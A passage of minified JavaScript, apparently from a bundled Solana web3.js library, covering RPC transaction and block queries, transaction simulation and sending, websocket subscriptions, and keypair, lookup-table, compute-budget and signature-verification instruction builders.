      if ("error" in o)
        throw new Rs(o.error, "failed to get block production information");
      return o.result;
    }
    async getTransaction(t, e) {
      const { commitment: n, config: r } = sa(e),
        o = this._buildArgsAtLeastConfirmed([t], n, void 0, r),
        i = Hr(await this._rpcRequest("getTransaction", o), Lu);
      if ("error" in i) throw new Rs(i.error, "failed to get transaction");
      const s = i.result;
      return s
        ? {
            ...s,
            transaction: {
              ...s.transaction,
              message: ha(s.version, s.transaction.message),
            },
          }
        : s;
    }
    async getParsedTransaction(t, e) {
      const { commitment: n, config: r } = sa(e),
        o = this._buildArgsAtLeastConfirmed([t], n, "jsonParsed", r),
        i = Hr(await this._rpcRequest("getTransaction", o), Nu);
      if ("error" in i) throw new Rs(i.error, "failed to get transaction");
      return i.result;
    }
    async getParsedTransactions(t, e) {
      const { commitment: n, config: r } = sa(e),
        o = t.map((t) => ({
          methodName: "getTransaction",
          args: this._buildArgsAtLeastConfirmed([t], n, "jsonParsed", r),
        }));
      return (await this._rpcBatchRequest(o)).map((t) => {
        const e = Hr(t, Nu);
        if ("error" in e) throw new Rs(e.error, "failed to get transactions");
        return e.result;
      });
    }
    async getTransactions(t, e) {
      const { commitment: n, config: r } = sa(e),
        o = t.map((t) => ({
          methodName: "getTransaction",
          args: this._buildArgsAtLeastConfirmed([t], n, void 0, r),
        }));
      return (await this._rpcBatchRequest(o)).map((t) => {
        const e = Hr(t, Lu);
        if ("error" in e) throw new Rs(e.error, "failed to get transactions");
        const n = e.result;
        return n
          ? {
              ...n,
              transaction: {
                ...n.transaction,
                message: ha(n.version, n.transaction.message),
              },
            }
          : n;
      });
    }
    async getConfirmedBlock(t, e) {
      const n = this._buildArgsAtLeastConfirmed([t], e),
        r = Hr(await this._rpcRequest("getBlock", n), Ou);
      if ("error" in r) throw new Rs(r.error, "failed to get confirmed block");
      const o = r.result;
      if (!o) throw new Error("Confirmed block " + t + " not found");
      const i = {
        ...o,
        transactions: o.transactions.map(({ transaction: t, meta: e }) => {
          const n = new hs(t.message);
          return { meta: e, transaction: { ...t, message: n } };
        }),
      };
      return {
        ...i,
        transactions: i.transactions.map(({ transaction: t, meta: e }) => ({
          meta: e,
          transaction: bs.populate(t.message, t.signatures),
        })),
      };
    }
    async getBlocks(t, e, n) {
      const r = this._buildArgsAtLeastConfirmed(void 0 !== e ? [t, e] : [t], n),
        o = Hr(await this._rpcRequest("getBlocks", r), la(Yr(no())));
      if ("error" in o) throw new Rs(o.error, "failed to get blocks");
      return o.result;
    }
    async getBlockSignatures(t, e) {
      const n = this._buildArgsAtLeastConfirmed([t], e, void 0, {
          transactionDetails: "signatures",
          rewards: !1,
        }),
        r = Hr(await this._rpcRequest("getBlock", n), Mu);
      if ("error" in r) throw new Rs(r.error, "failed to get block");
      const o = r.result;
      if (!o) throw new Error("Block " + t + " not found");
      return o;
    }
    async getConfirmedBlockSignatures(t, e) {
      const n = this._buildArgsAtLeastConfirmed([t], e, void 0, {
          transactionDetails: "signatures",
          rewards: !1,
        }),
        r = Hr(await this._rpcRequest("getBlock", n), Mu);
      if ("error" in r) throw new Rs(r.error, "failed to get confirmed block");
      const o = r.result;
      if (!o) throw new Error("Confirmed block " + t + " not found");
      return o;
    }
    async getConfirmedTransaction(t, e) {
      const n = this._buildArgsAtLeastConfirmed([t], e),
        r = Hr(await this._rpcRequest("getTransaction", n), Lu);
      if ("error" in r) throw new Rs(r.error, "failed to get transaction");
      const o = r.result;
      if (!o) return o;
      const i = new hs(o.transaction.message),
        s = o.transaction.signatures;
      return { ...o, transaction: bs.populate(i, s) };
    }
    async getParsedConfirmedTransaction(t, e) {
      const n = this._buildArgsAtLeastConfirmed([t], e, "jsonParsed"),
        r = Hr(await this._rpcRequest("getTransaction", n), Nu);
      if ("error" in r)
        throw new Rs(r.error, "failed to get confirmed transaction");
      return r.result;
    }
    async getParsedConfirmedTransactions(t, e) {
      const n = t.map((t) => ({
        methodName: "getTransaction",
        args: this._buildArgsAtLeastConfirmed([t], e, "jsonParsed"),
      }));
      return (await this._rpcBatchRequest(n)).map((t) => {
        const e = Hr(t, Nu);
        if ("error" in e)
          throw new Rs(e.error, "failed to get confirmed transactions");
        return e.result;
      });
    }
    async getConfirmedSignaturesForAddress(t, e, n) {
      let r = {},
        o = await this.getFirstAvailableBlock();
      for (; !("until" in r) && !(--e <= 0 || e < o); )
        try {
          const t = await this.getConfirmedBlockSignatures(e, "finalized");
          t.signatures.length > 0 &&
            (r.until = t.signatures[t.signatures.length - 1].toString());
        } catch (s) {
          if (s instanceof Error && s.message.includes("skipped")) continue;
          throw s;
        }
      let i = await this.getSlot("finalized");
      for (; !("before" in r || ++n > i); )
        try {
          const t = await this.getConfirmedBlockSignatures(n);
          t.signatures.length > 0 &&
            (r.before = t.signatures[t.signatures.length - 1].toString());
        } catch (s) {
          if (s instanceof Error && s.message.includes("skipped")) continue;
          throw s;
        }
      return (await this.getConfirmedSignaturesForAddress2(t, r)).map(
        (t) => t.signature
      );
    }
    async getConfirmedSignaturesForAddress2(t, e, n) {
      const r = this._buildArgsAtLeastConfirmed([t.toBase58()], n, void 0, e),
        o = Hr(
          await this._rpcRequest("getConfirmedSignaturesForAddress2", r),
          Za
        );
      if ("error" in o)
        throw new Rs(o.error, "failed to get confirmed signatures for address");
      return o.result;
    }
    async getSignaturesForAddress(t, e, n) {
      const r = this._buildArgsAtLeastConfirmed([t.toBase58()], n, void 0, e),
        o = Hr(await this._rpcRequest("getSignaturesForAddress", r), Ja);
      if ("error" in o)
        throw new Rs(o.error, "failed to get signatures for address");
      return o.result;
    }
    async getAddressLookupTable(t, e) {
      const { context: n, value: r } = await this.getAccountInfoAndContext(
        t,
        e
      );
      let o = null;
      return (
        null !== r && (o = new ta({ key: t, state: ta.deserialize(r.data) })),
        { context: n, value: o }
      );
    }
    async getNonceAndContext(t, e) {
      const { context: n, value: r } = await this.getAccountInfoAndContext(
        t,
        e
      );
      let o = null;
      return (
        null !== r && (o = Ws.fromAccountData(r.data)), { context: n, value: o }
      );
    }
    async getNonce(t, e) {
      return await this.getNonceAndContext(t, e)
        .then((t) => t.value)
        .catch((e) => {
          throw new Error(
            "failed to get nonce for account " + t.toBase58() + ": " + e
          );
        });
    }
    async requestAirdrop(t, e) {
      const n = Hr(
        await this._rpcRequest("requestAirdrop", [t.toBase58(), e]),
        zu
      );
      if ("error" in n)
        throw new Rs(n.error, `airdrop to ${t.toBase58()} failed`);
      return n.result;
    }
    async _blockhashWithExpiryBlockHeight(t) {
      if (!t) {
        for (; this._pollingBlockhash; ) await Ms(100);
        const t = Date.now() - this._blockhashInfo.lastFetch >= 3e4;
        if (null !== this._blockhashInfo.latestBlockhash && !t)
          return this._blockhashInfo.latestBlockhash;
      }
      return await this._pollNewBlockhash();
    }
    async _pollNewBlockhash() {
      this._pollingBlockhash = !0;
      try {
        const t = Date.now(),
          e = this._blockhashInfo.latestBlockhash,
          n = e ? e.blockhash : null;
        for (let r = 0; r < 50; r++) {
          const t = await this.getLatestBlockhash("finalized");
          if (n !== t.blockhash)
            return (
              (this._blockhashInfo = {
                latestBlockhash: t,
                lastFetch: Date.now(),
                transactionSignatures: [],
                simulatedSignatures: [],
              }),
              t
            );
          await Ms(200);
        }
        throw new Error(
          `Unable to obtain a new blockhash after ${Date.now() - t}ms`
        );
      } finally {
        this._pollingBlockhash = !1;
      }
    }
    async getStakeMinimumDelegation(t) {
      const { commitment: e, config: n } = sa(t),
        r = this._buildArgs([], e, "base64", n),
        o = Hr(
          await this._rpcRequest("getStakeMinimumDelegation", r),
          da(no())
        );
      if ("error" in o)
        throw new Rs(o.error, "failed to get stake minimum delegation");
      return o.result;
    }
    async simulateTransaction(t, e, n) {
      if ("message" in t) {
        const r = t.serialize(),
          o = lt.from(r).toString("base64");
        if (Array.isArray(e) || void 0 !== n)
          throw new Error("Invalid arguments");
        const i = e || {};
        (i.encoding = "base64"),
          "commitment" in i || (i.commitment = this.commitment),
          e &&
            "object" == typeof e &&
            "innerInstructions" in e &&
            (i.innerInstructions = e.innerInstructions);
        const s = [o, i],
          a = Hr(await this._rpcRequest("simulateTransaction", s), Ca);
        if ("error" in a)
          throw new Error("failed to simulate transaction: " + a.error.message);
        return a.result;
      }
      let r;
      if (t instanceof bs) {
        let e = t;
        (r = new bs()),
          (r.feePayer = e.feePayer),
          (r.instructions = t.instructions),
          (r.nonceInfo = e.nonceInfo),
          (r.signatures = e.signatures);
      } else (r = bs.populate(t)), (r._message = r._json = void 0);
      if (void 0 !== e && !Array.isArray(e))
        throw new Error("Invalid arguments");
      const o = e;
      if (r.nonceInfo && o) r.sign(...o);
      else {
        let t = this._disableBlockhashCaching;
        for (;;) {
          const e = await this._blockhashWithExpiryBlockHeight(t);
          if (
            ((r.lastValidBlockHeight = e.lastValidBlockHeight),
            (r.recentBlockhash = e.blockhash),
            !o)
          )
            break;
          if ((r.sign(...o), !r.signature)) throw new Error("!signature");
          const n = r.signature.toString("base64");
          if (
            !this._blockhashInfo.simulatedSignatures.includes(n) &&
            !this._blockhashInfo.transactionSignatures.includes(n)
          ) {
            this._blockhashInfo.simulatedSignatures.push(n);
            break;
          }
          t = !0;
        }
      }
      const i = r._compile(),
        s = i.serialize(),
        a = r._serialize(s).toString("base64"),
        u = { encoding: "base64", commitment: this.commitment };
      if (n) {
        const t = (Array.isArray(n) ? n : i.nonProgramIds()).map((t) =>
          t.toBase58()
        );
        u.accounts = { encoding: "base64", addresses: t };
      }
      o && (u.sigVerify = !0),
        e &&
          "object" == typeof e &&
          "innerInstructions" in e &&
          (u.innerInstructions = e.innerInstructions);
      const c = [a, u],
        l = Hr(await this._rpcRequest("simulateTransaction", c), Ca);
      if ("error" in l) {
        let t;
        if (
          "data" in l.error &&
          ((t = l.error.data.logs), t && Array.isArray(t))
        ) {
          const e = "\n    ";
          t.join(e);
          void 0;
        }
        throw new Ps({
          action: "simulate",
          signature: "",
          transactionMessage: l.error.message,
          logs: t,
        });
      }
      return l.result;
    }
    async sendTransaction(t, e, n) {
      if ("version" in t) {
        if (e && Array.isArray(e)) throw new Error("Invalid arguments");
        const n = t.serialize();
        return await this.sendRawTransaction(n, e);
      }
      if (void 0 === e || !Array.isArray(e))
        throw new Error("Invalid arguments");
      const r = e;
      if (t.nonceInfo) t.sign(...r);
      else {
        let e = this._disableBlockhashCaching;
        for (;;) {
          const n = await this._blockhashWithExpiryBlockHeight(e);
          if (
            ((t.lastValidBlockHeight = n.lastValidBlockHeight),
            (t.recentBlockhash = n.blockhash),
            t.sign(...r),
            !t.signature)
          )
            throw new Error("!signature");
          const o = t.signature.toString("base64");
          if (!this._blockhashInfo.transactionSignatures.includes(o)) {
            this._blockhashInfo.transactionSignatures.push(o);
            break;
          }
          e = !0;
        }
      }
      const o = t.serialize();
      return await this.sendRawTransaction(o, n);
    }
    async sendRawTransaction(t, e) {
      const n = Ki(t).toString("base64");
      return await this.sendEncodedTransaction(n, e);
    }
    async sendEncodedTransaction(t, e) {
      const n = { encoding: "base64" },
        r = e && e.skipPreflight,
        o =
          !0 === r
            ? "processed"
            : (e && e.preflightCommitment) || this.commitment;
      e && null != e.maxRetries && (n.maxRetries = e.maxRetries),
        e && null != e.minContextSlot && (n.minContextSlot = e.minContextSlot),
        r && (n.skipPreflight = r),
        o && (n.preflightCommitment = o);
      const i = [t, n],
        s = Hr(await this._rpcRequest("sendTransaction", i), Ku);
      if ("error" in s) {
        let t;
        throw (
          ("data" in s.error && (t = s.error.data.logs),
          new Ps({
            action: r ? "send" : "simulate",
            signature: "",
            transactionMessage: s.error.message,
            logs: t,
          }))
        );
      }
      return s.result;
    }
    _wsOnOpen() {
      (this._rpcWebSocketConnected = !0),
        (this._rpcWebSocketHeartbeat = setInterval(() => {
          (async () => {
            try {
              await this._rpcWebSocket.notify("ping");
            } catch {}
          })();
        }, 5e3)),
        this._updateSubscriptions();
    }
    _wsOnError(t) {
      this._rpcWebSocketConnected = !1;
    }
    _wsOnClose(t) {
      if (
        ((this._rpcWebSocketConnected = !1),
        (this._rpcWebSocketGeneration =
          (this._rpcWebSocketGeneration + 1) % Number.MAX_SAFE_INTEGER),
        this._rpcWebSocketIdleTimeout &&
          (clearTimeout(this._rpcWebSocketIdleTimeout),
          (this._rpcWebSocketIdleTimeout = null)),
        this._rpcWebSocketHeartbeat &&
          (clearInterval(this._rpcWebSocketHeartbeat),
          (this._rpcWebSocketHeartbeat = null)),
        1e3 === t)
      )
        return this._updateSubscriptions(), void 0;
      (this._subscriptionCallbacksByServerSubscriptionId = {}),
        Object.entries(this._subscriptionsByHash).forEach(([t, e]) => {
          this._setSubscription(t, { ...e, state: "pending" });
        });
    }
    _setSubscription(t, e) {
      var n;
      const r = null == (n = this._subscriptionsByHash[t]) ? void 0 : n.state;
      if (((this._subscriptionsByHash[t] = e), r !== e.state)) {
        const n = this._subscriptionStateChangeCallbacksByHash[t];
        n &&
          n.forEach((t) => {
            try {
              t(e.state);
            } catch {}
          });
      }
    }
    _onSubscriptionStateChange(t, e) {
      var n;
      const r = this._subscriptionHashByClientSubscriptionId[t];
      if (null == r) return () => {};
      const o =
        (n = this._subscriptionStateChangeCallbacksByHash)[r] ||
        (n[r] = new Set());
      return (
        o.add(e),
        () => {
          o.delete(e),
            0 === o.size &&
              delete this._subscriptionStateChangeCallbacksByHash[r];
        }
      );
    }
    async _updateSubscriptions() {
      if (0 === Object.keys(this._subscriptionsByHash).length)
        return (
          this._rpcWebSocketConnected &&
            ((this._rpcWebSocketConnected = !1),
            (this._rpcWebSocketIdleTimeout = setTimeout(() => {
              this._rpcWebSocketIdleTimeout = null;
              try {
                this._rpcWebSocket.close();
              } catch (t) {
                t instanceof Error, 0;
              }
            }, 500))),
          void 0
        );
      if (
        (null !== this._rpcWebSocketIdleTimeout &&
          (clearTimeout(this._rpcWebSocketIdleTimeout),
          (this._rpcWebSocketIdleTimeout = null),
          (this._rpcWebSocketConnected = !0)),
        !this._rpcWebSocketConnected)
      )
        return this._rpcWebSocket.connect(), void 0;
      const t = this._rpcWebSocketGeneration,
        e = () => t === this._rpcWebSocketGeneration;
      await Promise.all(
        Object.keys(this._subscriptionsByHash).map(async (t) => {
          const n = this._subscriptionsByHash[t];
          if (void 0 !== n)
            switch (n.state) {
              case "pending":
              case "unsubscribed":
                if (0 === n.callbacks.size)
                  return (
                    delete this._subscriptionsByHash[t],
                    "unsubscribed" === n.state &&
                      delete this._subscriptionCallbacksByServerSubscriptionId[
                        n.serverSubscriptionId
                      ],
                    await this._updateSubscriptions(),
                    void 0
                  );
                await (async () => {
                  const { args: r, method: o } = n;
                  try {
                    this._setSubscription(t, { ...n, state: "subscribing" });
                    const e = await this._rpcWebSocket.call(o, r);
                    this._setSubscription(t, {
                      ...n,
                      serverSubscriptionId: e,
                      state: "subscribed",
                    }),
                      (this._subscriptionCallbacksByServerSubscriptionId[e] =
                        n.callbacks),
                      await this._updateSubscriptions();
                  } catch (i) {
                    if ((void 0, !e())) return;
                    this._setSubscription(t, { ...n, state: "pending" }),
                      await this._updateSubscriptions();
                  }
                })();
                break;
              case "subscribed":
                0 === n.callbacks.size &&
                  (await (async () => {
                    const { serverSubscriptionId: r, unsubscribeMethod: o } = n;
                    if (this._subscriptionsAutoDisposedByRpc.has(r))
                      this._subscriptionsAutoDisposedByRpc.delete(r);
                    else {
                      this._setSubscription(t, {
                        ...n,
                        state: "unsubscribing",
                      }),
                        this._setSubscription(t, {
                          ...n,
                          state: "unsubscribing",
                        });
                      try {
                        await this._rpcWebSocket.call(o, [r]);
                      } catch (i) {
                        if ((i instanceof Error, 0, !e())) return;
                        return (
                          this._setSubscription(t, {
                            ...n,
                            state: "subscribed",
                          }),
                          await this._updateSubscriptions(),
                          void 0
                        );
                      }
                    }
                    this._setSubscription(t, { ...n, state: "unsubscribed" }),
                      await this._updateSubscriptions();
                  })());
            }
        })
      );
    }
    _handleServerNotification(t, e) {
      const n = this._subscriptionCallbacksByServerSubscriptionId[t];
      void 0 !== n &&
        n.forEach((t) => {
          try {
            t(...e);
          } catch (n) {
            void 0;
          }
        });
    }
    _wsOnAccountNotification(t) {
      const { result: e, subscription: n } = Hr(t, Ya);
      this._handleServerNotification(n, [e.value, e.context]);
    }
    _makeSubscription(t, e) {
      const n = this._nextClientSubscriptionId++,
        r = Zs([t.method, e]),
        o = this._subscriptionsByHash[r];
      return (
        void 0 === o
          ? (this._subscriptionsByHash[r] = {
              ...t,
              args: e,
              callbacks: new Set([t.callback]),
              state: "pending",
            })
          : o.callbacks.add(t.callback),
        (this._subscriptionHashByClientSubscriptionId[n] = r),
        (this._subscriptionDisposeFunctionsByClientSubscriptionId[n] =
          async () => {
            delete this._subscriptionDisposeFunctionsByClientSubscriptionId[n],
              delete this._subscriptionHashByClientSubscriptionId[n];
            const e = this._subscriptionsByHash[r];
            us(
              void 0 !== e,
              `Could not find a \`Subscription\` when tearing down client subscription #${n}`
            ),
              e.callbacks.delete(t.callback),
              await this._updateSubscriptions();
          }),
        this._updateSubscriptions(),
        n
      );
    }
    onAccountChange(t, e, n) {
      const { commitment: r, config: o } = sa(n),
        i = this._buildArgs(
          [t.toBase58()],
          r || this._commitment || "finalized",
          "base64",
          o
        );
      return this._makeSubscription(
        {
          callback: e,
          method: "accountSubscribe",
          unsubscribeMethod: "accountUnsubscribe",
        },
        i
      );
    }
    async removeAccountChangeListener(t) {
      await this._unsubscribeClientSubscription(t, "account change");
    }
    _wsOnProgramAccountNotification(t) {
      const { result: e, subscription: n } = Hr(t, $a);
      this._handleServerNotification(n, [
        { accountId: e.value.pubkey, accountInfo: e.value.account },
        e.context,
      ]);
    }
    onProgramAccountChange(t, e, n, r) {
      const { commitment: o, config: i } = sa(n),
        s = this._buildArgs(
          [t.toBase58()],
          o || this._commitment || "finalized",
          "base64",
          i || (r ? { filters: aa(r) } : void 0)
        );
      return this._makeSubscription(
        {
          callback: e,
          method: "programSubscribe",
          unsubscribeMethod: "programUnsubscribe",
        },
        s
      );
    }
    async removeProgramAccountChangeListener(t) {
      await this._unsubscribeClientSubscription(t, "program account change");
    }
    onLogs(t, e, n) {
      const r = this._buildArgs(
        ["object" == typeof t ? { mentions: [t.toString()] } : t],
        n || this._commitment || "finalized"
      );
      return this._makeSubscription(
        {
          callback: e,
          method: "logsSubscribe",
          unsubscribeMethod: "logsUnsubscribe",
        },
        r
      );
    }
    async removeOnLogsListener(t) {
      await this._unsubscribeClientSubscription(t, "logs");
    }
    _wsOnLogsNotification(t) {
      const { result: e, subscription: n } = Hr(t, ju);
      this._handleServerNotification(n, [e.value, e.context]);
    }
    _wsOnSlotNotification(t) {
      const { result: e, subscription: n } = Hr(t, eu);
      this._handleServerNotification(n, [e]);
    }
    onSlotChange(t) {
      return this._makeSubscription(
        {
          callback: t,
          method: "slotSubscribe",
          unsubscribeMethod: "slotUnsubscribe",
        },
        []
      );
    }
    async removeSlotChangeListener(t) {
      await this._unsubscribeClientSubscription(t, "slot change");
    }
    _wsOnSlotUpdatesNotification(t) {
      const { result: e, subscription: n } = Hr(t, ru);
      this._handleServerNotification(n, [e]);
    }
    onSlotUpdate(t) {
      return this._makeSubscription(
        {
          callback: t,
          method: "slotsUpdatesSubscribe",
          unsubscribeMethod: "slotsUpdatesUnsubscribe",
        },
        []
      );
    }
    async removeSlotUpdateListener(t) {
      await this._unsubscribeClientSubscription(t, "slot update");
    }
    async _unsubscribeClientSubscription(t, e) {
      const n = this._subscriptionDisposeFunctionsByClientSubscriptionId[t];
      n ? await n() : void 0;
    }
    _buildArgs(t, e, n, r) {
      const o = e || this._commitment;
      if (o || n || r) {
        let e = {};
        n && (e.encoding = n),
          o && (e.commitment = o),
          r && (e = Object.assign(e, r)),
          t.push(e);
      }
      return t;
    }
    _buildArgsAtLeastConfirmed(t, e, n, r) {
      const o = e || this._commitment;
      if (o && !["confirmed", "finalized"].includes(o))
        throw new Error(
          "Using Connection with default commitment: `" +
            this._commitment +
            "`, but method requires at least `confirmed`"
        );
      return this._buildArgs(t, e, n, r);
    }
    _wsOnSignatureNotification(t) {
      const { result: e, subscription: n } = Hr(t, ou);
      "receivedSignature" !== e.value &&
        this._subscriptionsAutoDisposedByRpc.add(n),
        this._handleServerNotification(
          n,
          "receivedSignature" === e.value
            ? [{ type: "received" }, e.context]
            : [{ type: "status", result: e.value }, e.context]
        );
    }
    onSignature(t, e, n) {
      const r = this._buildArgs([t], n || this._commitment || "finalized"),
        o = this._makeSubscription(
          {
            callback: (t, n) => {
              if ("status" === t.type) {
                e(t.result, n);
                try {
                  this.removeSignatureListener(o);
                } catch (r) {}
              }
            },
            method: "signatureSubscribe",
            unsubscribeMethod: "signatureUnsubscribe",
          },
          r
        );
      return o;
    }
    onSignatureWithOptions(t, e, n) {
      const { commitment: r, ...o } = {
          ...n,
          commitment: (n && n.commitment) || this._commitment || "finalized",
        },
        i = this._buildArgs([t], r, void 0, o),
        s = this._makeSubscription(
          {
            callback: (t, n) => {
              e(t, n);
              try {
                this.removeSignatureListener(s);
              } catch (r) {}
            },
            method: "signatureSubscribe",
            unsubscribeMethod: "signatureUnsubscribe",
          },
          i
        );
      return s;
    }
    async removeSignatureListener(t) {
      await this._unsubscribeClientSubscription(t, "signature result");
    }
    _wsOnRootNotification(t) {
      const { result: e, subscription: n } = Hr(t, iu);
      this._handleServerNotification(n, [e]);
    }
    onRootChange(t) {
      return this._makeSubscription(
        {
          callback: t,
          method: "rootSubscribe",
          unsubscribeMethod: "rootUnsubscribe",
        },
        []
      );
    }
    async removeRootChangeListener(t) {
      await this._unsubscribeClientSubscription(t, "root change");
    }
  }
  class Hu {
    constructor(t) {
      (this._keypair = void 0), (this._keypair = t ?? Di());
    }
    static generate() {
      return new Hu(Di());
    }
    static fromSecretKey(t, e) {
      if (64 !== t.byteLength) throw new Error("bad secret key size");
      const n = t.slice(32, 64);
      if (!e || !e.skipValidation) {
        const e = t.slice(0, 32),
          r = Ui(e);
        for (let t = 0; t < 32; t++)
          if (n[t] !== r[t]) throw new Error("provided secretKey is invalid");
      }
      return new Hu({ publicKey: n, secretKey: t });
    }
    static fromSeed(t) {
      const e = Ui(t),
        n = new Uint8Array(64);
      return n.set(t), n.set(e, 32), new Hu({ publicKey: e, secretKey: n });
    }
    get publicKey() {
      return new Xi(this._keypair.publicKey);
    }
    get secretKey() {
      return new Uint8Array(this._keypair.secretKey);
    }
  }
  const Xu = Object.freeze({
    CreateLookupTable: {
      index: 0,
      layout: Cr.struct([
        Cr.u32("instruction"),
        zs("recentSlot"),
        Cr.u8("bumpSeed"),
      ]),
    },
    FreezeLookupTable: { index: 1, layout: Cr.struct([Cr.u32("instruction")]) },
    ExtendLookupTable: {
      index: 2,
      layout: Cr.struct([
        Cr.u32("instruction"),
        zs(),
        Cr.seq(ns(), Cr.offset(Cr.u32(), -8), "addresses"),
      ]),
    },
    DeactivateLookupTable: {
      index: 3,
      layout: Cr.struct([Cr.u32("instruction")]),
    },
    CloseLookupTable: { index: 4, layout: Cr.struct([Cr.u32("instruction")]) },
  });
  class Zu {
    constructor() {}
    static createLookupTable(t) {
      const [e, n] = Xi.findProgramAddressSync(
          [t.authority.toBuffer(), Nr().encode(t.recentSlot)],
          this.programId
        ),
        r = Ls(Xu.CreateLookupTable, {
          recentSlot: BigInt(t.recentSlot),
          bumpSeed: n,
        }),
        o = [
          { pubkey: e, isSigner: !1, isWritable: !0 },
          { pubkey: t.authority, isSigner: !0, isWritable: !1 },
          { pubkey: t.payer, isSigner: !0, isWritable: !0 },
          { pubkey: Fs.programId, isSigner: !1, isWritable: !1 },
        ];
      return [new ws({ programId: this.programId, keys: o, data: r }), e];
    }
    static freezeLookupTable(t) {
      const e = Ls(Xu.FreezeLookupTable),
        n = [
          { pubkey: t.lookupTable, isSigner: !1, isWritable: !0 },
          { pubkey: t.authority, isSigner: !0, isWritable: !1 },
        ];
      return new ws({ programId: this.programId, keys: n, data: e });
    }
    static extendLookupTable(t) {
      const e = Ls(Xu.ExtendLookupTable, {
          addresses: t.addresses.map((t) => t.toBytes()),
        }),
        n = [
          { pubkey: t.lookupTable, isSigner: !1, isWritable: !0 },
          { pubkey: t.authority, isSigner: !0, isWritable: !1 },
        ];
      return (
        t.payer &&
          n.push(
            { pubkey: t.payer, isSigner: !0, isWritable: !0 },
            { pubkey: Fs.programId, isSigner: !1, isWritable: !1 }
          ),
        new ws({ programId: this.programId, keys: n, data: e })
      );
    }
    static deactivateLookupTable(t) {
      const e = Ls(Xu.DeactivateLookupTable),
        n = [
          { pubkey: t.lookupTable, isSigner: !1, isWritable: !0 },
          { pubkey: t.authority, isSigner: !0, isWritable: !1 },
        ];
      return new ws({ programId: this.programId, keys: n, data: e });
    }
    static closeLookupTable(t) {
      const e = Ls(Xu.CloseLookupTable),
        n = [
          { pubkey: t.lookupTable, isSigner: !1, isWritable: !0 },
          { pubkey: t.authority, isSigner: !0, isWritable: !1 },
          { pubkey: t.recipient, isSigner: !1, isWritable: !0 },
        ];
      return new ws({ programId: this.programId, keys: n, data: e });
    }
  }
  Zu.programId = new Xi("AddressLookupTab1e1111111111111111111111111");
  const Ju = Object.freeze({
    RequestUnits: {
      index: 0,
      layout: Cr.struct([
        Cr.u8("instruction"),
        Cr.u32("units"),
        Cr.u32("additionalFee"),
      ]),
    },
    RequestHeapFrame: {
      index: 1,
      layout: Cr.struct([Cr.u8("instruction"), Cr.u32("bytes")]),
    },
    SetComputeUnitLimit: {
      index: 2,
      layout: Cr.struct([Cr.u8("instruction"), Cr.u32("units")]),
    },
    SetComputeUnitPrice: {
      index: 3,
      layout: Cr.struct([Cr.u8("instruction"), zs("microLamports")]),
    },
  });
  class Yu {
    constructor() {}
    static requestUnits(t) {
      const e = Ls(Ju.RequestUnits, t);
      return new ws({ keys: [], programId: this.programId, data: e });
    }
    static requestHeapFrame(t) {
      const e = Ls(Ju.RequestHeapFrame, t);
      return new ws({ keys: [], programId: this.programId, data: e });
    }
    static setComputeUnitLimit(t) {
      const e = Ls(Ju.SetComputeUnitLimit, t);
      return new ws({ keys: [], programId: this.programId, data: e });
    }
    static setComputeUnitPrice(t) {
      const e = Ls(Ju.SetComputeUnitPrice, {
        microLamports: BigInt(t.microLamports),
      });
      return new ws({ keys: [], programId: this.programId, data: e });
    }
  }
  Yu.programId = new Xi("ComputeBudget111111111111111111111111111111");
  const Qu = Cr.struct([
    Cr.u8("numSignatures"),
    Cr.u8("padding"),
    Cr.u16("signatureOffset"),
    Cr.u16("signatureInstructionIndex"),
    Cr.u16("publicKeyOffset"),
    Cr.u16("publicKeyInstructionIndex"),
    Cr.u16("messageDataOffset"),
    Cr.u16("messageDataSize"),
    Cr.u16("messageInstructionIndex"),
  ]);
  class $u {
    constructor() {}
    static createInstructionWithPublicKey(t) {
      const { publicKey: e, message: n, signature: r, instructionIndex: o } = t;
      us(
        32 === e.length,
        `Public Key must be 32 bytes but received ${e.length} bytes`
      ),
        us(
          64 === r.length,
          `Signature must be 64 bytes but received ${r.length} bytes`
        );
      const i = Qu.span,
        s = i + e.length,
        a = s + r.length,
        u = lt.alloc(a + n.length),
        c = null == o ? 65535 : o;
      return (
        Qu.encode(
          {
            numSignatures: 1,
            padding: 0,
            signatureOffset: s,
            signatureInstructionIndex: c,
            publicKeyOffset: i,
            publicKeyInstructionIndex: c,
            messageDataOffset: a,
            messageDataSize: n.length,
            messageInstructionIndex: c,
          },
          u
        ),
        u.fill(e, i),
        u.fill(r, s),
        u.fill(n, a),
        new ws({ keys: [], programId: $u.programId, data: u })
      );
    }
    static createInstructionWithPrivateKey(t) {
      const { privateKey: e, message: n, instructionIndex: r } = t;
      us(
        64 === e.length,
        `Private key must be 64 bytes but received ${e.length} bytes`
      );
      try {
        const t = Hu.fromSecretKey(e),
          o = t.publicKey.toBytes(),
          i = Wi(n, t.secretKey);
        return this.createInstructionWithPublicKey({
          publicKey: o,
          message: n,
          signature: i,
          instructionIndex: r,
        });
      } catch (o) {
        throw new Error(`Error creating instruction; ${o}`);
      }
    }
  }
  $u.programId = new Xi("Ed25519SigVerify111111111111111111111111111");
  Li.utils.isValidPrivateKey;
  const tc = Li.getPublicKey,
    ec = Cr.struct([
      Cr.u8("numSignatures"),
      Cr.u16("signatureOffset"),
      Cr.u8("signatureInstructionIndex"),
      Cr.u16("ethAddressOffset"),
      Cr.u8("ethAddressInstructionIndex"),
      Cr.u16("messageDataOffset"),
      Cr.u16("messageDataSize"),
      Cr.u8("messageInstructionIndex"),
      Cr.blob(20, "ethAddress"),
      Cr.blob(64, "signature"),
      Cr.u8("recoveryId"),
    ]);
  class nc {
    constructor() {}
    static publicKeyToEthAddress(t) {
      us(
        64 === t.length,
        `Public key must be 64 bytes but received ${t.length} bytes`
      );
      try {
        return lt.from(hi(Ki(t))).slice(-20);
      } catch (e) {
        throw new Error(`Error constructing Ethereum address: ${e}`);
      }
    }
    static createInstructionWithPublicKey(t) {
      const {
        publicKey: e,
        message: n,
        signature: r,
        recoveryId: o,
        instructionIndex: i,
      } = t;
      return nc.createInstructionWithEthAddress({
        ethAddress: nc.publicKeyToEthAddress(e),
        message: n,
        signature: r,
        recoveryId: o,
        instructionIndex: i,
      });
    }
    static createInstructionWithEthAddress(t) {
      const {
        ethAddress: e,
        message: n,
        signature: r,
        recoveryId: o,
        instructionIndex: i = 0,
      } = t;
      let s;
      (s =
        "string" == typeof e
          ? e.startsWith("0x")
            ? lt.from(e.substr(2), "hex")
            : lt.from(e, "hex")
          : e),
        us(
          20 === s.length,
          `Address must be 20 bytes but received ${s.length} bytes`
        );
      const a = 12 + s.length,
        u = a + r.length + 1,
        c = lt.alloc(ec.span + n.length);
      return (
        ec.encode(
          {
            numSignatures: 1,
            signatureOffset: a,
            signatureInstructionIndex: i,
            ethAddressOffset: 12,
